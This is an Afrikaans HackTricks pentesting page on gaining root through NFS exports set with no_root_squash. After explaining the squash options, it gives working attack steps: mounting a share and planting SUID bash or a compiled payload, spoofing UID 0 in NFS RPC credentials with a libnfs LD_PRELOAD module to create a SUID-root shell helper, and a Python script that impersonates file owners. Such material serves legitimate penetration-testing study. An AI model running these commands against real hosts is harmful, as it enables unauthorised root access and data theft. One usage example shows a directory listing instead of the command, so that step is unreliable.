# NFS No Root Squash-wanopstelling vir Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basiese inligting oor squashing

Met NFS AUTH_SYS/AUTH_UNIX baseer die bediener lêertoegangskontroles op die `uid` en `gid` wat in elke RPC-versoek verskaf word. Ander sekuriteitsgeure, soos Kerberos, gebruik ander geloofsbriewe, en die bediener kan numeriese geloofsbriewe karteer voordat toestemmings nagegaan word.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Karteer elke UID en GID na die anonieme rekening, wat op Linux by verstek `nobody` (65534) is. `no_all_squash` is die verstek vir versoeke wat nie van root af kom nie.<sup>[[4]](#references)</sup>
- **`root_squash`**: Dit is die verstek op Linux en karteer versoeke met UID/GID 0 (root) na die anonieme rekening; ander UID's en GID's word nie gesquash nie.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Skakel root squashing af, sodat versoeke met UID/GID 0 as root op die bediener geëvalueer kan word.<sup>[[4]](#references)</sup>

As 'n toegelate kliënt 'n skryfbare export kan mount wat in **`/etc/exports`** met **`no_root_squash`** opgestel is, kan sy UID/GID 0-versoeke daar as die bediener se root-gebruiker skryf.<sup>[[4]](#references)</sup>

`root_squash` karteer slegs UID/GID 0 om; onder AUTH_SYS kan 'n toegelate kliënt se **nie-nul numeriese UID/GID** steeds met 'n ander rekening op die bediener ooreenstem. 'n Skryfbare export kan dus selfs met root squashing 'n pad tussen gebruikers word as die kliënt 'n lêer met daardie numeriese identiteit kan skep en die bediener toegang toelaat. Vir 'n SUID/SGID-oordrag moet jy ook die resulterende lêereienaar, uitvoertoegang, die bediener se mount se `nosuid`-status, ACL's en SELinux of ander beleide nagaan. Die geëksporteerde padnaam, `rw`-opsie of ooreenstemmende nommer bewys op sigself nie dat die kliënt toegang het, dat die export aktief is of dat die twee gashere dieselfde effektiewe identiteitskartering gebruik nie. Inspekteer `/etc/exports` en plaaslike metadata passief; moenie tydens enumerasie 'n nuwe share mount of 'n toetslêer skep nie.<sup>[[4]](#references)[[5]](#references)</sup>

Vir meer inligting oor **NFS**, kyk na:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Opsie 1 met bash:
- Op 'n toegelate kliënt, mount 'n skryfbare export as root, kopieer **`/bin/bash`** daarheen, stel sy **SUID**-bit in en voer dit uit vanaf 'n slagoffer se mount wat nie `nosuid` gebruik nie.<sup>[[2]](#references)[[4]](#references)</sup>
    - Om te verseker dat die opgelaaide lêer deur root besit bly, moet die bediener **`no_root_squash`** gebruik. As root gesquash word, is 'n SUID-binêre vir 'n ander rekening slegs moontlik wanneer die kliënt dit wettiglik met daardie rekening se numeriese UID/GID kan skep of besit.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Opsie 2 met gecompileerde C-kode:
- Koppel die gids vanaf ’n toegelate kliënt, kopieer ’n saamgestelde payload in wat SUID-toestemmings misbruik, stel die **SUID**-bit in en voer dit vanaf die slagoffer uit (sien ’n paar [C SUID-payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Dieselfde beperkings as voorheen

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> Let daarop dat as jy **’n tonnel van jou masjien na die slagoffermasjien kan skep, jy steeds die Remote-weergawe kan gebruik om hierdie privilege escalation uit te buit deur die vereiste poorte te tonnel**.\
> Die volgende truuk is nuttig wanneer `/etc/exports` die uitvoer tot die slagoffer se IP beperk: die afgeleë kliënt kan dit nie mount nie, maar die plaaslike tegniek kan deur die share werk wat reeds op die toegelate gasheer gemount is.<sup>[[2]](#references)</sup>\
> Vir hierdie unprivileged libnfs-metode moet die uitvoer in **`/etc/exports`** die `insecure`-flag gebruik sodat die proses ’n nie-gereserveerde bronpoort kan gebruik; `secure` is die verstek, hoewel ’n proses wat ’n gereserveerde poort kan bind nie hierdie opsie nodig het nie.<sup>[[1]](#references)[[4]](#references)</sup>

### Basiese inligting

’n NFSv3 AUTH_UNIX-kliënt sluit sy effektiewe UID, GID en groepe by elke oproep in, en die bediener gebruik dit vir toestemmingskontroles. Hierdie plaaslike tegniek misbruik daardie model deur die RPC-bewyse via [libnfs](https://github.com/sahlberg/libnfs) te vervals; die preload-module daarvan ondersteun die oorheersing van die UID/GID in die NFS-konteks.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Die biblioteek saamstel

Die libnfs-voorbeeld kan aanpassings vir die teikenkern vereis; die deurloop wat hier gebruik word, meld spesifiek dat die fallocate-syscalls uitgekommentarieer moet word voordat die preload-module saamgestel word.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Die Exploit uitvoer

Die voorbeeld skep ’n klein C-helper wat ’n shell begin, plaas dit dan op die share en gebruik `ld_nfs.so` met UID 0 in die NFS-konteks om dit SUID-root te maak.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Kompileer die exploit-kode:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Plaas die exploit op die share en verander sy toestemmings deur die UID te vervals**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Voer die exploit uit om root privileges te verkry**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell vir Stealthy-lêertoegang

Sodra root-toegang verkry is, stel hierdie `nfsh.py`-patroon die effektiewe UID op die teikenlêer se UID voordat ’n opdrag uitgevoer word, sodat toegang verkry kan word sonder om eienaarskap rekursief te verander.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Voer dit soos volg uit:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] ['n Verhaal van 'n minder bekende NFS-privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS-weergawe 3-protokolspesifikasie](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
